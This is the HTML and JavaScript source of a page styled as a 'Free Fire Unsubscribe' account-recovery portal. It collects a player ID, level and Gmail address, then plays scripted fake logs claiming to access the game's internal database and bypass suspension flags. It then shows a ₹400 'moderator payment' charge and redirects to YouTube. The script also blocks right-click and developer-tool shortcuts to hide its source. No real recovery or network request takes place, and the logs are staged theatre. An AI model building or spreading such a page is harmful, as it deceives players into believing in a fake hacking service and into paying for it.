<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Free Fire Unsubscribe Portal</title>
    <style>
        /* Global Styles & Performance Optimization */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: '-apple-system', BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
        }

        /* Fixed Mobile Scrolling & Performance */
        body {
            background-color: #0f0f13;
            background-image: linear-gradient(135deg, rgba(0, 255, 128, 0.05) 0%, rgba(255, 0, 128, 0.05) 100%);
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start; /* Changed from center to allow natural scrolling */
            padding: 40px 15px;
            overflow-x: hidden;
            overflow-y: auto;
        }

        /* Container */
        .container {
            width: 100%;
            max-width: 500px;
            /* Initially hidden until intro finishes */
            opacity: 0;
            transform: scale(0.95);
            transition: opacity 0.8s ease, transform 0.8s ease;
            display: none; 
        }

        .container.show {
            opacity: 1;
            transform: scale(1);
        }

        /* Optimized Glass Panel */
        .glass-panel {
            background: rgba(20, 20, 25, 0.6);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 35px 25px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
            transform: translateZ(0); /* Hardware acceleration */
            margin-bottom: 20px;
        }

        /* Shake Animation */
        @keyframes shakeError {
            0%, 100% { transform: translate3d(0, 0, 0); }
            10%, 30%, 50%, 70%, 90% { transform: translate3d(-8px, 0, 0); }
            20%, 40%, 60%, 80% { transform: translate3d(8px, 0, 0); }
        }

        .shake {
            animation: shakeError 0.5s cubic-bezier(.36,.07,.19,.97) both;
            border: 1px solid rgba(255, 51, 102, 0.6);
        }

        header {
            text-align: center;
            margin-bottom: 25px;
        }

        h1 {
            font-size: 2rem;
            color: #00ff44;
            text-transform: uppercase;
            font-weight: 800;
            text-shadow: 0 0 10px rgba(0, 255, 68, 0.5);
            letter-spacing: 1px;
        }

        /* Form Elements */
        .form-group {
            margin-bottom: 20px;
            position: relative;
            width: 100%;
        }

        label {
            display: block;
            margin-bottom: 6px;
            font-size: 0.9rem;
            color: #a0a0a5;
            font-weight: 500;
            padding-left: 5px;
        }

        input, select {
            width: 100%;
            padding: 14px 16px;
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.15);
            background: rgba(0, 0, 0, 0.4);
            color: #fff;
            font-size: 1.05rem;
            transition: border-color 0.2s ease, box-shadow 0.2s ease;
            outline: none;
            appearance: none;
        }

        select {
            background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%23FFFFFF%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E");
            background-repeat: no-repeat;
            background-position: right 15px top 50%;
            background-size: 14px auto;
        }

        select option {
            background: #1e1e23;
            color: #fff;
        }

        input:focus, select:focus {
            border-color: #00ff44;
        }

        input.input-error, select.input-error {
            border-color: #ff3366 !important;
        }

        .error-msg {
            color: #ff3366;
            font-size: 0.85rem;
            margin-top: 6px;
            padding-left: 5px;
            font-weight: bold;
            display: none;
        }

        /* Proceed Button */
        .btn-submit {
            background: linear-gradient(135deg, #00ff44, #00b330);
            color: #000;
            border: 2px solid rgba(0, 255, 102, 0.5);
            padding: 16px;
            font-size: 1.2rem;
            border-radius: 10px;
            cursor: pointer;
            text-transform: uppercase;
            font-weight: 800;
            width: 100%;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            margin-top: 10px;
            letter-spacing: 1.2px;
            box-shadow: 0 0 15px rgba(0, 255, 68, 0.6);
        }

        .btn-submit:active {
            transform: scale(0.97);
        }

        /* Processing Logs Layout */
        .processing-container {
            display: none;
            flex-direction: column;
            width: 100%;
            height: 100%;
            padding: 5px;
        }

        .process-log {
            width: 100%;
            height: 400px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 12px;
            font-family: 'Courier New', Courier, monospace;
        }

        .log-entry {
            font-size: 1.05rem;
            font-weight: bold;
            color: rgba(255,255,255,0.8);
            line-height: 1.4;
            text-align: left;
            word-wrap: break-word;
            opacity: 0;
            transform: translate3d(0, 10px, 0);
            transition: opacity 0.3s ease, transform 0.3s ease;
        }
        
        .log-entry.visible {
            opacity: 1;
            transform: translate3d(0, 0, 0);
        }

        .typing-cursor::after {
            content: '█';
            animation: blinkCursor 0.5s infinite;
            margin-left: 5px;
        }

        @keyframes blinkCursor {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

        .c-system { color: #00ccff; text-shadow: 0 0 8px rgba(0, 204, 255, 0.7); }
        .c-found { color: #00ff44; text-shadow: 0 0 8px rgba(0, 255, 68, 0.7); }
        .c-magenta { color: #ff00ff; text-shadow: 0 0 8px rgba(255, 0, 255, 0.7); }
        .c-purple { color: #aa00ff; text-shadow: 0 0 8px rgba(170, 0, 255, 0.7); }
        .c-fetch { color: #ffcc00; text-shadow: 0 0 8px rgba(255, 204, 0, 0.7); }
        .c-pay { color: #ff9900; text-shadow: 0 0 8px rgba(255, 153, 0, 0.7); }

        /* =========================================
           1. INTRO MAGNETIC SPLASH SCREEN
           ========================================= */
        .intro-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 99999;
            transition: opacity 0.5s ease;
        }

        .intro-overlay.hide {
            opacity: 0;
            pointer-events: none;
        }

        .magnetic-container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            max-width: 95%;
            text-align: center;
        }

        .char {
            font-size: 3rem;
            font-weight: 900;
            color: #fff; /* Pure White */
            text-transform: uppercase;
            text-shadow: 0 0 15px rgba(255, 255, 255, 0.8), 0 0 30px rgba(255, 255, 255, 0.5); /* White Glow */
            display: inline-block;
            opacity: 0;
            will-change: transform, opacity;
        }

        /* =========================================
           2. TELEGRAM-STYLE ROCKET ANIMATION
           ========================================= */
        .rocket-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(5px);
            -webkit-backdrop-filter: blur(5px);
            z-index: 10005;
            display: none; /* Display flex when active */
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .telegram-plane {
            width: 120px;
            height: 120px;
            fill: #fff; /* White plane */
            filter: drop-shadow(0 0 20px #00ccff) drop-shadow(0 0 40px #00ccff); /* Cyan glowing trail */
            /* Start position: Bottom Left off-screen */
            transform: translate3d(-100vw, 100vh, 0) rotate(10deg) scale(0.5);
            will-change: transform;
        }

        /* Flight Phase 1: Fly into Center */
        .telegram-plane.fly-in {
            transition: transform 1.2s cubic-bezier(0.25, 1, 0.5, 1);
            transform: translate3d(0, 0, 0) rotate(-15deg) scale(1.5);
        }

        /* Flight Phase 2: Shoot out to Top Right */
        .telegram-plane.fly-out {
            transition: transform 0.8s cubic-bezier(0.5, 0, 1, 0.5);
            transform: translate3d(150vw, -150vh, 0) rotate(25deg) scale(0.8);
        }

        /* =========================================
           3. SIMPLE BLINKING IMAGE TRANSITION
           ========================================= */
        .transition-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.95);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
        }

        .transition-screen.active {
            opacity: 1;
            pointer-events: all;
        }

        .transition-image {
            max-width: 15%;
            max-height: 15%;
            animation: blinkImage 1s infinite ease-in-out;
        }

        @keyframes blinkImage {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.6; transform: scale(0.9); }
        }

        @media (max-width: 480px) {
            body { padding: 25px 15px; }
            .glass-panel { padding: 30px 20px; min-height: 480px; }
            h1 { font-size: 1.7rem; }
            .transition-image { max-width: 25%; max-height: 25%; }
            .char { font-size: 2.2rem; }
            .telegram-plane { width: 90px; height: 90px; }
        }
    </style>
</head>
<body>

    <div class="intro-overlay" id="introOverlay">
        <div class="magnetic-container" id="introMagneticText"></div>
    </div>

    <div class="transition-screen" id="transitionScreen">
        <img src="https://pending404.github.io/image/ff-loding.png" alt="Loading" class="transition-image">
    </div>

    <div class="rocket-overlay" id="rocketOverlay">
        <svg class="telegram-plane" id="telegramPlane" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M22 2L2 8.66l7.18 2.52 10.36-9.13-7.9 9.87.03 5.48 3.06-4.22L20.44 22 22 2z"/>
        </svg>
    </div>

    <div class="container" id="mainContainer">
        <div class="glass-panel" id="glassPanel">
            
            <div id="formSection">
                <header>
                    <h1>Free Fire Unsubscribe</h1>
                </header>
                
                <form id="unsubscribeForm" novalidate>
                    <div class="form-group">
                        <label>Free Fire Player ID</label>
                        <input type="text" id="uid" inputmode="numeric" placeholder="Please enter your UID" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                        <div class="error-msg" id="uidError">Please enter a valid Player ID.</div>
                    </div>

                    <div class="form-group">
                        <label>Your Device</label>
                        <select id="device">
                            <option value="" disabled selected>Choose your device</option>
                            <option value="Android">Android</option>
                            <option value="iPhone">iOS (iPhone)</option>
                            <option value="PC">PC (Emulator)</option>
                        </select>
                        <div class="error-msg" id="deviceError">Please select your device.</div>
                    </div>

                    <div class="form-group">
                        <label>Server Region</label>
                        <select id="server">
                            <option value="" disabled selected>Select your server</option>
                            <option value="India">India</option>
                            <option value="Bangladesh">Bangladesh</option>
                            <option value="Singapore">Singapore</option>
                            <option value="MENA">MENA</option>
                            <option value="Brazil">Brazil</option>
                        </select>
                        <div class="error-msg" id="serverError">Please select a server region.</div>
                    </div>

                    <div class="form-group">
                        <label>Reason for Unsubscribe</label>
                        <select id="reason">
                            <option value="" disabled selected>Select a reason...</option>
                            <option value="Galti se ho gaya unsubscribe">Galti se ho gaya unsubscribe</option>
                            <option value="Maine janbuj ke khud Kiya">Maine janbuj ke khud Kiya</option>
                            <option value="Kisi aur Ne Kar Diya">Kisi aur Ne Kar Diya</option>
                            <option value="Gmail compromise ho gaya tha">Gmail compromise ho gaya tha</option>
                            <option value="Mere ko pata nahin">Mere ko pata nahin</option>
                        </select>
                        <div class="error-msg" id="reasonError">Please select a reason.</div>
                    </div>

                    <div class="form-group">
                        <label>ID Level</label>
                        <input type="text" id="level" inputmode="numeric" placeholder="Enter ID Level" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                        <div class="error-msg" id="levelError">ID mismatch or Level not found.</div>
                    </div>

                    <div class="form-group">
                        <label>Unsubscribed Gmail ID</label>
                        <input type="email" id="gmail" placeholder="Enter email address">
                        <div class="error-msg" id="gmailError">Please enter a valid email address.</div>
                    </div>

                    <button type="button" class="btn-submit" id="proceedBtn">PROCEED</button>
                </form>
            </div>

            <div class="processing-container" id="processingSection">
                <div class="process-log" id="processLog">
                    </div>
            </div>

        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            
            // Security constraints
            document.addEventListener('contextmenu', event => event.preventDefault());
            document.onkeydown = function(e) {
                if(e.keyCode == 123) return false;
                if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) return false;
                if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
            }

            const introOverlay = document.getElementById('introOverlay');
            const introMagneticText = document.getElementById('introMagneticText');
            const mainContainer = document.getElementById('mainContainer');
            
            const proceedBtn = document.getElementById('proceedBtn');
            const glassPanel = document.getElementById('glassPanel');
            const formSection = document.getElementById('formSection');
            const processingSection = document.getElementById('processingSection');
            const processLog = document.getElementById('processLog');
            
            const rocketOverlay = document.getElementById('rocketOverlay');
            const telegramPlane = document.getElementById('telegramPlane');
            
            const transitionScreen = document.getElementById('transitionScreen');

            // --- 1. INTRO MAGNETIC ANIMATION ---
            function runIntroAnimation() {
                const text = "FREE FIRE UNSUBSCRIBE";
                introMagneticText.innerHTML = '';
                const charElements = [];
                const words = text.split(' ');

                words.forEach((word, wordIndex) => {
                    const wordDiv = document.createElement('div');
                    wordDiv.style.display = 'inline-block';
                    wordDiv.style.margin = '0 10px';

                    word.split('').forEach(char => {
                        const span = document.createElement('span');
                        span.innerText = char;
                        span.className = 'char';
                        
                        // Scatter far away initially
                        const rx = (Math.random() - 0.5) * 2000;
                        const ry = (Math.random() - 0.5) * 2000;
                        const rz = (Math.random() - 0.5) * 1000;
                        const rotate = (Math.random() - 0.5) * 360;
                        
                        span.style.transform = `translate3d(${rx}px, ${ry}px, ${rz}px) rotate(${rotate}deg) scale(3)`;
                        
                        wordDiv.appendChild(span);
                        charElements.push(span);
                    });
                    
                    introMagneticText.appendChild(wordDiv);
                    if (wordIndex === 1) { // Break line after "FIRE"
                        introMagneticText.appendChild(document.createElement('br'));
                    }
                });

                // Animate to form the sentence
                setTimeout(() => {
                    charElements.forEach((span, i) => {
                        setTimeout(() => {
                            span.style.transition = 'transform 1s cubic-bezier(0.165, 0.84, 0.44, 1), opacity 0.8s ease';
                            span.style.transform = 'translate3d(0,0,0) rotate(0deg) scale(1)';
                            span.style.opacity = '1';
                        }, i * 35); // Stagger
                    });
                }, 100);

                // Wait for animation to hold, then hide overlay and show container
                const totalAnimTime = (charElements.length * 35) + 1000;
                setTimeout(() => {
                    introOverlay.classList.add('hide');
                    mainContainer.style.display = 'block';
                    
                    // Small delay to trigger CSS fade in
                    setTimeout(() => {
                        mainContainer.classList.add('show');
                    }, 50);

                }, totalAnimTime + 1500); // 1.5s holding time
            }

            // Run intro immediately
            runIntroAnimation();

            // --- 2. FORM VALIDATION & RED LINE REMOVAL ---
            const allInputs = document.querySelectorAll('input, select');
            allInputs.forEach(input => {
                input.addEventListener('input', function() {
                    this.classList.remove('input-error');
                    const errorMsg = document.getElementById(this.id + 'Error');
                    if (errorMsg) errorMsg.style.display = 'none';
                });
            });

            proceedBtn.addEventListener('click', () => {
                let isValid = true;

                const uid = document.getElementById('uid');
                const device = document.getElementById('device');
                const server = document.getElementById('server');
                const reason = document.getElementById('reason');
                const level = document.getElementById('level');
                const gmail = document.getElementById('gmail');

                const validateField = (element, condition) => {
                    if(condition) {
                        element.classList.add('input-error');
                        document.getElementById(element.id + 'Error').style.display = 'block';
                        isValid = false;
                    }
                };

                validateField(uid, uid.value.length < 7 || uid.value.length > 16);
                validateField(device, device.value === "");
                validateField(server, server.value === "");
                validateField(reason, reason.value === "");
                
                const lvlNum = parseInt(level.value);
                validateField(level, isNaN(lvlNum) || lvlNum < 11 || lvlNum > 95);

                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                validateField(gmail, !emailRegex.test(gmail.value));

                if (!isValid) {
                    glassPanel.classList.remove('shake');
                    void glassPanel.offsetWidth; 
                    glassPanel.classList.add('shake');
                    return; 
                }

                startSequence(uid.value, level.value, gmail.value);
            });

            function maskEmail(email) {
                let parts = email.split('@');
                let name = parts[0];
                let domain = parts[1];
                if(name.length > 2) {
                    return name[0] + '*******' + name[name.length - 1] + '@' + domain;
                } else {
                    return name[0] + '***@' + domain;
                }
            }

            function startSequence(uid, level, email) {
                const maskedEmail = maskEmail(email);

                // Show Blinking Logo
                transitionScreen.classList.add('active');

                setTimeout(() => {
                    transitionScreen.classList.remove('active');
                    
                    formSection.style.display = 'none';
                    processingSection.style.display = 'flex';

                    runFastTypingAnimation(uid, level, maskedEmail);

                }, 1500); 
            }

            // --- 3. CODING TYPING ANIMATION ---
            function runFastTypingAnimation(uid, level, maskedEmail) {
                const logs = [
                    `<span class="c-system">[System]</span> Initiating secure connection to Free Fire Internal DB...`,
                    `<span class="c-found">[Found]</span> UID Account Data: ${uid}`,
                    `<span class="c-magenta">[Scan]</span> Authenticating Account Level: ${level}...`,
                    `<span class="c-fetch">[Fetch]</span> Locating Unsubscribed Gmail ID...`,
                    `<span class="c-found">[Match]</span> Target Email: ${maskedEmail}`,
                    `<span class="c-purple">[Process]</span> Bypassing Suspension Flags & Internal Bindings...`,
                    `<span class="c-purple">[Sync]</span> Synchronizing New Gmail Credentials...`,
                    `<span class="c-pay">Moderator payment charges: ₹400</span>`
                ];

                let lineIndex = 0;

                function typeNextLine() {
                    if (lineIndex < logs.length) {
                        const lineDiv = document.createElement('div');
                        lineDiv.className = 'log-entry typing-cursor visible';
                        processLog.appendChild(lineDiv);

                        let textHTML = logs[lineIndex];
                        let currentHTML = "";
                        let isTag = false;
                        let i = 0;

                        const typeInterval = setInterval(() => {
                            if (i < textHTML.length) {
                                if (textHTML[i] === '<') isTag = true;
                                currentHTML += textHTML[i];
                                if (textHTML[i] === '>') isTag = false;

                                lineDiv.innerHTML = currentHTML; 
                                processLog.scrollTop = processLog.scrollHeight; 
                                i++;
                            } else {
                                clearInterval(typeInterval);
                                lineDiv.classList.remove('typing-cursor');
                                lineIndex++;
                                setTimeout(typeNextLine, 300); 
                            }
                        }, 20);

                    } else {
                        // All text done, trigger Rocket Illusion
                        setTimeout(triggerRocketIllusion, 600);
                    }
                }

                typeNextLine();
            }

            // --- 4. ROCKET ILLUSION ANIMATION ---
            function triggerRocketIllusion() {
                // Show rocket overlay
                rocketOverlay.style.display = 'flex';
                
                // Slight delay to allow display:flex to register before animation
                setTimeout(() => {
                    // Fly into center
                    telegramPlane.classList.add('fly-in');
                    
                    // Hold in center for 1.2s to build illusion
                    setTimeout(() => {
                        // Fly away rapidly
                        telegramPlane.classList.add('fly-out');
                        
                        // Wait for fly-out to finish, then show final blink and redirect
                        setTimeout(() => {
                            rocketOverlay.style.display = 'none';
                            
                            transitionScreen.style.zIndex = "10010"; // Ensure above all
                            transitionScreen.classList.add('active');

                            setTimeout(() => {
                                window.location.href = "https://youtu.be/DK_UsATwoxI?si=lLLHC_Sr5TxTiY2x";
                            }, 2500);

                        }, 800); // Fly out duration

                    }, 1200); // Holding duration

                }, 50);
            }
        });
    </script>
</body>
</html>
